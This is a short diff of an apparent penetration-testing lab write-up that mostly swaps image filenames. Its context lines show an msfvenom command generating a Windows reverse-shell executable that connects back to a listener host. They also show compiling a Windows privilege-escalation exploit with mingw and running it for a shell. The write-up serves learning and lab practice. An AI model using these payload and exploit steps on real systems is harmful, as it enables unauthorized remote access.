@@ -113,15 +113,15 @@ msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.228 -f exe
 
 after being very anoyed i tried another path, i looked at the os version:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 and found something that seemed to suit the situation:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I had problems compiling the exploit:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 * The default `gcc` compiler on Linux does **not** include Windows headers by default.
 * The missing file suggests that i'm trying to compile a Windows-based program on a Linux system without the necessary Windows libraries.
@@ -140,7 +140,7 @@ i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 
 and i just run the exploit and manage to get my shell:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### 5. Cleanup
 
